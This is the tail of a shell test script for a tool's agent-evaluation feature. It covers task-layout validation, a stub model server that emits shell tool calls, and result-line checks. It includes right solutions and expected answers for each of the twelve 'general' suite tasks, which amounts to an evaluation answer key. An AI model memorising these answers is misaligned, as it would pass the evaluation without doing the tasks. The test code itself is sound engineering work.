        content, finish = last.get("content") or "", "stop"
        if last["role"] == "tool":
            delta = {"role": "assistant", "content": "got " + content}
        elif "CALL: " in content:
            cmd = content.split("CALL: ", 1)[1].split("\n", 1)[0]
            call = {"index": 0, "id": "c1", "type": "function", "function": {"name": "shell", "arguments": json.dumps({"command": cmd})}}
            delta, finish = {"role": "assistant", "tool_calls": [call]}, "tool_calls"
        elif "BYTES" in content:
            delta = {"role": "assistant", "content": TEXT}
        else:
            delta = {"role": "assistant", "content": "yes" if "\n- probe: " in system else "no"}
        sse = (chunk(delta) + chunk({}, finish) + "data: [DONE]\n\n").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Content-Length", str(len(sse)))
        self.end_headers()
        self.wfile.write(sse)
    def log_message(self, *a):
        pass
s = socketserver.TCPServer(("127.0.0.1", 0), H)
open(os.path.join(d, "port"), "w").write(str(s.server_address[1]))
s.serve_forever()
PY
  stub_start "$d"
}

# A task T in DIR: prompt PROMPT, a setup that writes a marker, and the check CHECK (sh).
mktask() { # DIR T PROMPT CHECK
  mkdir -p "$1/$2"
  printf '%s\n' "$3" >"$1/$2/prompt.txt"
  printf '#!/bin/sh\nprintf "made by setup\\n" >marker\n' >"$1/$2/setup"
  printf '#!/bin/sh\n%s\n' "$4" >"$1/$2/check"
  chmod 755 "$1/$2/setup" "$1/$2/check"
}

# eval/1's layout (eval --check, and a module's eval/ in verify and add) and eval's refusals before any run.
t_eval() {
  case_ "eval --check: the general suite and the layout rules"
  local e="$W/ev" t
  run eval --check "$HERE/../eval/general"
  rc_is 0
  out_has "ok: eval/1, 12 tasks"
  mktask "$e" one "Say yes." '[ "$(cat)" = yes ]'
  printf 'about the tasks\n' >"$e/README.md" && printf 'x\n' >"$e/.hidden" && printf 'x\n' >"$e/one/.notes"
  mkdir -p "$e/one/fake-bin" && printf '#!/bin/sh\n' >"$e/one/fake-bin/jq" && chmod 755 "$e/one/fake-bin/jq"
  printf '# limits\nmax_steps = 10000\nmax_seconds = 9999\n' >"$e/one/task.toml"
  run eval --check "$e"
  rc_is 0
  out_has "ok: eval/1, 1 tasks"
  # Each broken copy of the task, alone in its dir, and the refusal that names it.
  bad() { # WHAT TEXT CHANGE
    rm -rf "$W/bad" && mkdir -p "$W/bad" && cp -R "$e/one" "$W/bad/one" && (cd "$W/bad/one" && eval "$3")
    run eval --check "$W/bad"
    refused "$2"
  }
  bad "no check" "one: no check" 'rm check'
  bad "a setup that cannot run" "setup: a program" 'chmod 644 setup'
  bad "an empty prompt" "0 bytes; fix: write a prompt of 1 to 4,096 bytes" ': >prompt.txt'
  bad "a prompt over 4 KiB" "4,097 bytes" 'head -c 4097 /dev/zero | tr "\000" x >prompt.txt'
  bad "U+202E in the prompt" "U+202E" 'printf "say \342\200\256 yes\n" >prompt.txt'
  bad "an unknown entry" "notes: unknown entry" 'printf x >notes'
  bad "a fake-bin entry that cannot run" "fake-bin/ holds programs" 'chmod 644 fake-bin/jq'
  bad "fake-bin a file" "fake-bin: not a directory" 'rm -r fake-bin && printf x >fake-bin'
  bad "an unknown task.toml key" "x: task.toml takes" 'printf "x = 1\n" >task.toml'
  bad "max_steps 0" "max_steps: task.toml takes" 'printf "max_steps = 0\n" >task.toml'
  bad "max_seconds a string" "max_seconds: task.toml takes" 'printf "max_seconds = \"3\"\n" >task.toml'
  bad "a task.toml line that is no assignment" "task.toml:1: expected key = value" 'printf "max_steps\n" >task.toml'
  rm -rf "$W/bad" && mkdir -p "$W/bad/Bad" && cp -R "$e/one/." "$W/bad/Bad/"
  run eval --check "$W/bad"
  refused "a task is a directory, and its name as a module's"
  rm -rf "$W/bad" && mkdir -p "$W/bad"
  run eval --check "$W/bad"
  refused "no task; fix:"

  case_ "a module's eval/ is held to eval/1 when it is added"
  mkmod "$W/probe"
  mkdir -p "$W/probe/eval" && cp -R "$e/one" "$W/probe/eval/one"
  run verify --dir "$W/probe"
  rc_is 0
  chmod 644 "$W/probe/eval/one/check"
  run verify --dir "$W/probe"
  refused "eval/one/check: a program"
  run add "$W/probe" --yes
  refused "eval/one/check: a program"
  chmod 755 "$W/probe/eval/one/check"
  run add "$W/probe" --yes
  rc_is 0

  case_ "eval: what it refuses before any run"
  printf '#!/bin/sh\necho "henki 0.2.0 (x)"\n' >"$W/henki" && chmod 755 "$W/henki"
  mkmod "$W/probe"
  mkmod "$W/plain"
  mkdir -p "$W/probe/eval" && cp -R "$e/one" "$W/probe/eval/one"
  run add "$W/probe" --yes
  run eval
  rc_is 2
  HENKI_BIN="$W/henki" run eval nope --yes
  refused "nope is not added"
  HENKI_BIN="$W/henki" run eval probe --repeats 0 --yes
  refused "--repeats 0: not a number from 1 to 99"
  HENKI_BIN="$W/henki" run eval probe --repeats 100 --yes
  refused "--repeats 100"
  HENKI_BIN="$W/henki" HENKI_DEPTH=1 run eval probe --yes
  refused "this runs inside henki (HENKI_DEPTH=1)"
  HENKI_BIN="$W/henki" run eval "$W/plain" --yes
  refused "plain has no eval/ tasks; fix: henki-mods eval $W/plain --suite general"
  HENKI_BIN="$W/henki" run eval probe --suite nope --yes
  refused "nope is not added"
  HENKI_BIN="$W/henki" HENKI_MODS_TTY="$W/no-tty" run eval probe
  refused "no terminal to ask on"
  out_has "eval: probe 0.1.0 (hd1:"
  out_has "each task's setup and check run as you, and henki with approve = auto"
  printf 'n\n' >"$W/answer"
  HENKI_BIN="$W/henki" HENKI_MODS_TTY="$W/answer" run eval probe
  refused "not run (the answer was no)"
  [ ! -e "$XDG_STATE_HOME/henki/eval.tsv" ] || fail "a refused eval wrote eval.tsv"
}

# Live: eval against a real henki and the eval stub, the arms told apart by what the model sees.
t_eval_live() {
  case_ "eval: two arms through henki run, the result lines, the repeats rule"
  live_ok || return
  local d="$W/stub" m="$W/probe" s="$W/suite" lines
  eval_stub_up "$d" || return
  mkdir -p "$CONF"
  printf 'model = "m"\nbase_url = "http://127.0.0.1:%s/v1"\next = ["~/elsewhere"]\n' "$STUB_PORT" >"$CONF/config.toml"
  chmod 600 "$CONF/config.toml"
  printf 'Be brief.\n' >"$CONF/AGENTS.md"
  mkmod "$m"
  printf '# probe: answers for tests\n' >"$m/doc.md"
  # ask: only the on arm's prompt lists probe; it also sees setup's marker and EVAL_DIR.
  mktask "$m/eval" ask "Is probe there?" '[ "$(cat)" = yes ] && [ -f marker ] && [ -f "$EVAL_DIR/prompt.txt" ]'
  # fake: a call runs fake-bin/fakething first on PATH, within max_steps.
  mktask "$m/eval" fake "CALL: fakething" 'command grep -q FAKE-OK'
  mkdir -p "$m/eval/fake/fake-bin" && printf '#!/bin/sh\necho FAKE-OK\n' >"$m/eval/fake/fake-bin/fakething"
  chmod 755 "$m/eval/fake/fake-bin/fakething" && printf 'max_steps = 3\n' >"$m/eval/fake/task.toml"
  # bytes: the check gets the answer's exact bytes (escapes, a surrogate pair, a tab, no added newline).
  mktask "$m/eval" bytes "BYTES" 'cmp - "$EVAL_DIR/.want"'
  printf 'caf\303\251 "q" back\\slash\ttab\nline two \342\200\213 \363\240\200\201 end' >"$m/eval/bytes/.want"
  run add "$m" --yes
  rc_is 0
  run eval probe --yes
  rc_is 0
  out_has "ask              on  pass  (ok, 1 steps,"
  out_has "ask              off fail  (ok, 1 steps,"
  out_has "fake             off pass  (ok, 2 steps,"
  out_has "bytes            off pass"
  out_lacks "10 more"
  check "eval/1 lines have CONTRACTS.md's fields" [ "$(awk -F '\t' '{ print NF }' "$XDG_STATE_HOME/henki/eval.tsv" | sort -u)" = "$(doc_fields eval/1)" ]
  lines=$(cat "$XDG_STATE_HOME/henki/eval.tsv")
  case "$lines" in "eval/1${tab}probe${tab}0.1.0${tab}$(field probe 8)${tab}m${tab}probe${tab}on${tab}9${tab}9${tab}"*"${nl}eval/1${tab}probe${tab}0.1.0${tab}"*"${tab}off${tab}6${tab}9${tab}"*) ;; *)
    fail "eval.tsv holds: $lines"
    ;;
  esac
  out_has "probe: on 9 of 9 passed, off 6 of 9; added to $XDG_STATE_HOME/henki/eval.tsv"
  # The arms within one pass of each other after 3 runs: 10 more, 13 each; --model names the model.
  mkdir -p "$s" && cp -R "$m/eval/fake" "$s/fake"
  : >"$d/models"
  run eval probe --suite "$s" --model other --yes
  rc_is 0
  out_has "the arms are within one pass of each other after 3 repeats: 10 more"
  [ "$(sort -u "$d/models")" = other ] || fail "the stub saw the models $(sort -u "$d/models" | tr '\n' ' ')"
  case "$(tail -n 2 "$XDG_STATE_HOME/henki/eval.tsv")" in *"${tab}other${tab}$s${tab}on${tab}13${tab}13${tab}"*"${tab}off${tab}13${tab}13${tab}"*) ;; *)
    fail "eval.tsv ends with: $(tail -n 2 "$XDG_STATE_HOME/henki/eval.tsv")"
    ;;
  esac
  # The general suite: every setup runs (none fails), one run per task and arm.
  run eval probe --suite general --repeats 1 --yes
  rc_is 0
  case "$(tail -n 1 "$XDG_STATE_HOME/henki/eval.tsv")" in *"${tab}general${tab}off${tab}"*"${tab}12${tab}"*) ;; *)
    fail "eval.tsv ends with: $(tail -n 1 "$XDG_STATE_HOME/henki/eval.tsv")"
    ;;
  esac
  kill "$STUB_PID" 2>/dev/null
  wait "$STUB_PID" 2>/dev/null
}

# The general suite's checks are deterministic and right: after each task's setup, a right solution and answer pass,
# and a near miss fails.
t_general() {
  case_ "the general suite: each check passes a right solution and fails a near miss"
  local g="$HERE/../eval/general" t n=0
  gen() { # TASK RIGHT_SOLUTION RIGHT_ANSWER WRONG_SOLUTION WRONG_ANSWER
    local which w sol ans
    n=$((n + 1))
    for which in right wrong; do
      w="$W/$1.$which"
      mkdir -p "$w"
      (cd "$w" && EVAL_DIR="$g/$1" "$g/$1/setup") </dev/null >"$W/setup.log" 2>&1 || {
        fail "$1: setup failed: $(cat "$W/setup.log")"
        return
      }
      if [ "$which" = right ]; then sol=$2 ans=$3; else sol=$4 ans=$5; fi
      (cd "$w" && eval "$sol") || fail "$1: the $which solution failed"
      if printf '%s\n' "$ans" | (cd "$w" && EVAL_DIR="$g/$1" "$g/$1/check") >/dev/null 2>&1; then
        [ "$which" = right ] || fail "$1: the check passed a near miss"
      else
        [ "$which" = wrong ] || fail "$1: the check failed the right answer"
      fi
    done
  }
  gen count-lines ': ' 'There are 19 such lines (status 404).' ': ' '23'
  gen rename 'cd photos && for f in *.JPG; do mv "$f" "${f%.JPG}.jpg"; done' done 'cd photos && for f in *JPG*; do mv "$f" "$(echo "$f" | tr A-Z a-z)"; done' done
  gen fix-script "printf '#!/bin/sh\necho \$((\$1 + \$2))\n' >sum.sh" fixed "printf '#!/bin/sh\necho 5\n' >sum.sh" fixed
  gen largest-file ': ' 'data/c/d/e/huge.bin' ': ' 'data/.cache'
  gen json-field '[ "$("$g/json-field/fake-bin/jq" .server.port config.json 2>&1; echo $?)" = "jq: command not found${nl}127" ]' '8443' ': ' '8443 (and 9443 for TLS)'
  gen git-log '[ "$(git log --diff-filter=A --format=%an -- parser.c)" = "Ada Lovelace" ]' 'Ada Lovelace' ': ' 'Alan Turing'
  gen write-script "printf '#!/bin/sh\nwc -w <\"\$1\"\n' >count-words && chmod 755 count-words" done "printf '#!/bin/sh\nwc -w \"\$1\"\n' >count-words && chmod 755 count-words" done
  gen config-value "sed 's/^timeout = 60\$/timeout = 30/' app.ini >x && mv x app.ini" done "sed 's/^timeout = .*/timeout = 30/' app.ini >x && mv x app.ini" done
  gen find-todo '[ "$(command grep -rn TODO src | cut -d: -f1,2)" = src/lib/parse.sh:14 ]' 'src/lib/parse.sh:14' ': ' 'src/lib/parse.sh:13'
  gen dir-tree 'mkdir -p site/css site/js site/img/icons && : >site/index.html' done 'mkdir -p site/css site/js site/img/icons && echo hi >site/index.html' done
  gen compare-files '[ "$(diff old.txt new.txt | sed -n 1p)" = 7c7 ]' '7: color = navy' ': ' '7: color = teal'
  gen explain-error '! ./run.sh >/dev/null 2>&1' 'settings.conf' 'touch settings.conf' 'settings.conf'
  t=$(cd "$g" && ls | wc -l | tr -d ' ')
  [ "$n" = "$t" ] || fail "the general suite has $t tasks, and this case covers $n"
}

all() {
  t_add_path
  t_ask
  t_git
  t_raw_blobs
  t_hd1
  t_refusals
  t_gitattributes
  t_transport
  t_case_clash
  t_awk_data
  t_lock_newer
  t_onoff
  t_verify
  t_list_bytes
  t_cards
  t_shadow
  t_official
  t_halti
  t_allow
  t_ext2
  t_observe
  t_ctx
  t_restart
  t_ports
  t_port_toy
  t_history
  t_policy
  t_exec
  t_context
  t_eval
}

static_bash32
static_contracts
static_formats
RUN=bash
all
t_live
t_history_live
t_halti_live
t_eval_live
t_general
# POSIX mode turns off some bash behaviour a script may lean on without knowing; the manager must not.
RUN="bash --posix"
all
if [ "$FAILS" != 0 ]; then
  echo "tests.sh: $FAILS checks failed in $CASES cases" >&2
  exit 1
fi
echo "tests.sh: $CASES cases passed"
